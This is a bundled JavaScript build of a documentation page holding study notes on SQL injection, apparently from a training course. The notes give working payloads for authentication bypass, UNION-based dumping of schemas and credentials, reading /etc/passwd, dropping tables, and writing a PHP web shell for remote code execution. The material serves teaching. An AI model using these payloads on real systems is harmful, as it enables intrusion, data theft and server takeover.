"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[2431],{5574:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>l,default:()=>h,frontMatter:()=>a,metadata:()=>i,toc:()=>o});const i=JSON.parse('{"id":"Hacking/HTB Academy/SQL injections","title":"SQL injections","description":"Most modern application use database in their backend to store data. In these applications, the users input some data and in the end this data is used to build SQL queries that are executed in the database.","source":"@site/docs/Hacking/HTB Academy/SQL injections.md","sourceDirName":"Hacking/HTB Academy","slug":"/Hacking/HTB Academy/SQL injections","permalink":"/docs/Hacking/HTB Academy/SQL injections","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Linux fundamentals","permalink":"/docs/Hacking/HTB Academy/Linux fundamentals"},"next":{"title":"Bash","permalink":"/docs/languages/bash"}}');var r=s(4848),t=s(8453);const a={},l="SQL injections",c={},o=[{value:"Types of SQL injections",id:"types-of-sql-injections",level:2},{value:"Enumerating for SQL injections",id:"enumerating-for-sql-injections",level:2},{value:"Subverting query logic",id:"subverting-query-logic",level:2},{value:"OR injection",id:"or-injection",level:3},{value:"Using comments",id:"using-comments",level:3},{value:"Union",id:"union",level:3},{value:"Reading files",id:"reading-files",level:2},{value:"Writing files",id:"writing-files",level:2}];function d(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"sql-injections",children:"SQL injections"})}),"\n",(0,r.jsx)(n.p,{children:"Most modern application use database in their backend to store data. In these applications, the users input some data and in the end this data is used to build SQL queries that are executed in the database."}),"\n",(0,r.jsxs)(n.p,{children:["If the queries are not properly protected, the user might abuse of them to perform any kind of database operation. This is called ",(0,r.jsx)(n.code,{children:"SQL Injection"}),". The term ",(0,r.jsx)(n.code,{children:"SQL"})," refers to relational databases."]}),"\n",(0,r.jsx)(n.p,{children:"Typically the database queries are executed this way:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'# A connection is establish using username/password and a database.\n$conn = new mysqli("localhost", "root", "password", "users");\n# A query is defined\n$query = "select * from logins";\n# The query is executed and the result is retrieved\n$result = $conn->query($query);\nwhile($row = $result->fetch_assoc() ){\n\techo $row["name"]."<br>";\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:"Usually user input is introduced in the SQL queries, e.g:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"$searchInput =  $_POST['findUser'];\n$query = \"select * from logins where username like '%$searchInput'\";\n$result = $conn->query($query);\n"})}),"\n",(0,r.jsxs)(n.p,{children:["If this is not properly secured, a user can craft a malicious payload that allow the attacker to execute anything in the database. In this example, when the user inputs ",(0,r.jsx)(n.code,{children:"admin"})," the query becomes:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"select * from logins where username like '%admin';\n"})}),"\n",(0,r.jsxs)(n.p,{children:["The problem comes with a payload like: ",(0,r.jsx)(n.code,{children:"1'; DROP TABLE users;"}),". In this case, the SQL query will be:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"select * from logins where username like '%1'; DROP TABLE users;'\n"})}),"\n",(0,r.jsxs)(n.p,{children:["And the user is able to delete the ",(0,r.jsx)(n.code,{children:"users"})," table."]}),"\n",(0,r.jsx)(n.h2,{id:"types-of-sql-injections",children:"Types of SQL injections"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"In-band: The output of the query is printed directly in the frontend and we can read it."}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["We can have ",(0,r.jsx)(n.code,{children:"Union"})," based SQL injections which we can pass the column to read and ",(0,r.jsx)(n.code,{children:"Error"})," based where we leverage PHP or SQL errors to reveal the output of the query."]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Blind: In this case, we cannot see the output of the query."}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["We can use ",(0,r.jsx)(n.code,{children:"Boolean"})," logic in SQL or ",(0,r.jsx)(n.code,{children:"Time"})," based queries, where the query is intentionally delayed using ",(0,r.jsx)(n.code,{children:"sleep"})," under certain conditions."]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Out-of-band: Sometimes, we don't have any access to the query output. In this case, we can forward the query results to an external system, e.g. DNS server."}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"enumerating-for-sql-injections",children:"Enumerating for SQL injections"}),"\n",(0,r.jsx)(n.p,{children:"First of all, we need to know if the input is vulnerable to SQLi. A good way to check this is to inject characters closely related to SQL in our input:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"'\t-> %27\n\"\t-> %22\n#\t-> %23\n;\t-> %3B\n)\t-> %29\n"})}),"\n",(0,r.jsx)(n.p,{children:"Sometimes, we might need to use the url-encoded value of the character."}),"\n",(0,r.jsx)(n.p,{children:"When we add this characters, we need to be observant to watch for any error or any other change in the application."}),"\n",(0,r.jsx)(n.h2,{id:"subverting-query-logic",children:"Subverting query logic"}),"\n",(0,r.jsx)(n.p,{children:"Let's image this SQL query:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';\n"})}),"\n",(0,r.jsxs)(n.p,{children:["If we introduce a ",(0,r.jsx)(n.code,{children:"'"})," char:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM logins WHERE username=''' AND password = 'something';\n"})}),"\n",(0,r.jsx)(n.p,{children:"We will see a Syntax error in the frontend and now we know this form is vulnerable to SQL injection."}),"\n",(0,r.jsx)(n.h3,{id:"or-injection",children:"OR injection"}),"\n",(0,r.jsx)(n.p,{children:"This simple query can be manipulated with the following payload:"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"admin' or '1'='1"})," which will result in the following query:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';\n"})}),"\n",(0,r.jsxs)(n.p,{children:["The logic of the query is changed, now it selects the username ",(0,r.jsx)(n.code,{children:"admin"})," or the password ",(0,r.jsx)(n.code,{children:"something"})," AND ",(0,r.jsx)(n.code,{children:"true"}),", which will return False because we don't know the actual password."]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"username='admin'"})," will evaluate to true when there's a username named ",(0,r.jsx)(n.code,{children:"admin"}),".\n",(0,r.jsx)(n.code,{children:"1'='1' AND password = 'something'"})," the first part will evaluate to true always, the second part only when the password is the correct one; since we don't know it, it will evalute to false. True AND False will evaluate to False."]}),"\n",(0,r.jsxs)(n.p,{children:["The ",(0,r.jsx)(n.code,{children:"OR"})," operator will evaluate to true when one of the two components is true, so we'll completely bypass the authentication mechanism."]}),"\n",(0,r.jsx)(n.p,{children:"If we don't know the username, we can abuse in the same way of the password field:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM logins WHERE username='notAdmin' or '1'='1' AND password = 'something' or '1'='1';\n"})}),"\n",(0,r.jsx)(n.h3,{id:"using-comments",children:"Using comments"}),"\n",(0,r.jsxs)(n.p,{children:["Just like any other language, SQL allows the use of comments as well. We can use ",(0,r.jsx)(n.code,{children:"#"})," or ",(0,r.jsx)(n.code,{children:"--"})," to include comments."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"mysql> SELECT username FROM logins; -- Selects usernames from the logins table \nmysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'\n"})}),"\n",(0,r.jsx)(n.p,{children:"If you introduce comments into the username, it will disable the part of the query that checks the password:"}),"\n",(0,r.jsxs)(n.p,{children:["Setting username to ",(0,r.jsx)(n.code,{children:"admin'-- "})," will create the following query:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';\n"})}),"\n",(0,r.jsx)(n.p,{children:"And we'll have an auth bypass. Sometimes SQL queries use parenthesis which might need to be taken into account when generating the payload, for example:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password == \"e7df7cd2ca07f4f1ab415d457a6e1c13\"\n"})}),"\n",(0,r.jsxs)(n.p,{children:["If we input username as ",(0,r.jsx)(n.code,{children:"admin')--"})," we will disable the password part and close the parenthesis correctly:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM logins WHERE (username='admin')-- AND id > 1) AND password == \"e7df7cd2ca07f4f1ab415d457a6e1c13\"\n"})}),"\n",(0,r.jsx)(n.p,{children:"and we'll have another auth bypass."}),"\n",(0,r.jsx)(n.h3,{id:"union",children:"Union"}),"\n",(0,r.jsxs)(n.p,{children:["The ",(0,r.jsx)(n.code,{children:"union"})," statement can be use to combine the fields coming from two separate selects. For example:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"mysql> SELECT * FROM ports;\n\n+----------+-----------+\n| code     | city      |\n+----------+-----------+\n| CN SHA   | Shanghai  |\n| SG SIN   | Singapore |\n| ZZ-21    | Shenzhen  |\n+----------+-----------+\n"})}),"\n",(0,r.jsx)(n.p,{children:"and"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"mysql> SELECT * FROM ships;\n\n+----------+-----------+\n| Ship     | city      |\n+----------+-----------+\n| Morrison | New York  |\n+----------+-----------+\n1 rows in set (0.00 sec)\n"})}),"\n",(0,r.jsxs)(n.p,{children:["We can use ",(0,r.jsx)(n.code,{children:"union"})," to combine both selects:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"mysql> SELECT * FROM ports UNION SELECT * FROM ships;\n\n+----------+-----------+\n| code     | city      |\n+----------+-----------+\n| CN SHA   | Shanghai  |\n| SG SIN   | Singapore |\n| Morrison | New York  |\n| ZZ-21    | Shenzhen  |\n+----------+-----------+\n4 rows in set (0.00 sec)\n"})}),"\n",(0,r.jsx)(n.p,{children:"The number of columns and data types of the combine data tables should be the same. For example:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"mysql> SELECT city FROM ports UNION SELECT * FROM ships;\n\nERROR 1222 (21000): The used SELECT statements have a different number of columns\n"})}),"\n",(0,r.jsx)(n.p,{children:"When the number of columns doesn't fit, you can just use a number to fill the missing columns."}),"\n",(0,r.jsxs)(n.p,{children:["We can use ",(0,r.jsx)(n.code,{children:"UNION"})," as another source of injections. For example in the query:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM products WHERE product_id = 'user_input'\n"})}),"\n",(0,r.jsx)(n.p,{children:"We can enter the following payload:"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"1' UNION SELECT username, password from passwords-- "})}),"\n",(0,r.jsx)(n.p,{children:"which will end up in the following query:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '\n"})}),"\n",(0,r.jsx)(n.p,{children:"and will reveal usernames and passwords."}),"\n",(0,r.jsx)(n.p,{children:"If the number of columns are not the same, use the previous trick to make the query work:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"UNION SELECT username, 2, 3, 4 from passwords-- '\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '\n\n+-----------+-----------+-----------+-----------+\n| product_1 | product_2 | product_3 | product_4 |\n+-----------+-----------+-----------+-----------+\n|   admin   |    2      |    3      |    4      |\n+-----------+-----------+-----------+-----------+\n"})}),"\n",(0,r.jsxs)(n.p,{children:["As seen in this example, we might need to know exactly the numbers of columns of a table. In order to do so, we can use ",(0,r.jsx)(n.code,{children:"ORDER BY"})," statement:"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"' order by 1-- -"}),", we can keep up incrementing the number until the query fails to execute, then we found the number of columns."]}),"\n",(0,r.jsxs)(n.p,{children:["We can use ",(0,r.jsx)(n.code,{children:"UNION"})," itself to detect the number of columns, e.g:"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"cn' UNION select 1,2,3-- -"}),". We add numbers until it works."]}),"\n",(0,r.jsx)(n.p,{children:"We also need to know which columns are printed into the application. We can inject junk data and see how it gets printed in the frontend, for example:"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"cn' UNION select 1,@@version,3,4-- -"}),"."]}),"\n",(0,r.jsx)(n.p,{children:"This way, we have found where we need to put our injection."}),"\n",(0,r.jsx)(n.p,{children:"Once we have the SQL injection working, we can run some interesting queries:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;\n\n+--------------------+\n| SCHEMA_NAME        |\n+--------------------+\n| mysql              |\n| information_schema |\n| performance_schema |\n| ilfreight          |\n| dev                |\n+--------------------+\n6 rows in set (0.01 sec)\n"})}),"\n",(0,r.jsx)(n.p,{children:"This finds all the available database in the server."}),"\n",(0,r.jsxs)(n.p,{children:["We can find the current database with ",(0,r.jsx)(n.code,{children:"SELECT database()"}),"."]}),"\n",(0,r.jsx)(n.p,{children:"We can use information schema database and tables table to retrieve a list of all the available tables:"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -"})}),"\n",(0,r.jsxs)(n.p,{children:["Here, we're using UNION SQL injection to dump all the tables available for the database ",(0,r.jsx)(n.code,{children:"dev"}),"."]}),"\n",(0,r.jsx)(n.p,{children:"A similar thing can be done to retrieve the columns of certain table:"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -"})}),"\n",(0,r.jsxs)(n.p,{children:["This will list the columns of the table named ",(0,r.jsx)(n.code,{children:"credentials"}),"."]}),"\n",(0,r.jsx)(n.p,{children:"Now we can dump the data in the credentials table:"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"cn' UNION select 1, username, password, 4 from dev.credentials-- -"})}),"\n",(0,r.jsxs)(n.p,{children:["Note the dot operator: the application is using another database than ",(0,r.jsx)(n.code,{children:"dev"}),". The dot operator is need to access other than the configured database."]}),"\n",(0,r.jsx)(n.h2,{id:"reading-files",children:"Reading files"}),"\n",(0,r.jsx)(n.p,{children:"Under certain conditions databases might be able to read files."}),"\n",(0,r.jsx)(n.p,{children:"The users have certain privileges configured, so first we need to gather which privileges the application user has."}),"\n",(0,r.jsx)(n.p,{children:"First, we need to know what user is the application using to deal with the data:"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -"})}),"\n",(0,r.jsx)(n.p,{children:"Now we can determine the privileges of the user:"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:'cn\' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee=\"'root'@'localhost'\"-- -"})}),"\n",(0,r.jsxs)(n.p,{children:["If ",(0,r.jsx)(n.code,{children:"FILE"})," privilege is granted, we can read files. Reading files cannot be simpler (if everything is setup correctly):"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:'cn\' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -'})}),"\n",(0,r.jsxs)(n.p,{children:["This will dump the contents of ",(0,r.jsx)(n.code,{children:"/etc/passwd"}),". We can dump the source code of the current php script as well:"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:'cn\' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -'}),". The problem is that the code is rendered, however, we can check the HTML source of the page and we'll see the PHP code."]}),"\n",(0,r.jsx)(n.h2,{id:"writing-files",children:"Writing files"}),"\n",(0,r.jsx)(n.p,{children:"Writing files require more privileges and more configuration:"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"FILE"})," privilege enabled."]}),"\n",(0,r.jsx)(n.li,{children:"MySQL global secure_file_priv variable not enabled"}),"\n",(0,r.jsx)(n.li,{children:"Write access to the location we want to write to on the back-end server"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["We can check the ",(0,r.jsx)(n.code,{children:"secure_file_priv"})," variable using the SQLi:"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:'cn\' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -'})}),"\n",(0,r.jsx)(n.p,{children:"If the result of the variable is empty, it means that we can read/write to any location."}),"\n",(0,r.jsxs)(n.p,{children:["To write to file, we can use ",(0,r.jsx)(n.code,{children:"SELECT * INTO OUTFILE <filename>"}),". For example:"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -"})}),"\n",(0,r.jsxs)(n.p,{children:["This will write the sentence ",(0,r.jsx)(n.code,{children:"file written successfully!"})," into the file ",(0,r.jsx)(n.code,{children:"/var/www/html/proof.txt"}),", which later we can download using the web server. Now that we can write files, we can even write a web shell:"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:'cn\' union select "",\'<?php system($_REQUEST[0]); ?>\', "", "" into outfile \'/var/www/html/shell.php\'-- -'})}),"\n",(0,r.jsxs)(n.p,{children:["And get RCE when visiting the ",(0,r.jsx)(n.code,{children:"shell.php"})," page."]})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>a,x:()=>l});var i=s(6540);const r={},t=i.createContext(r);function a(e){const n=i.useContext(t);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),i.createElement(t.Provider,{value:n},e.children)}}}]);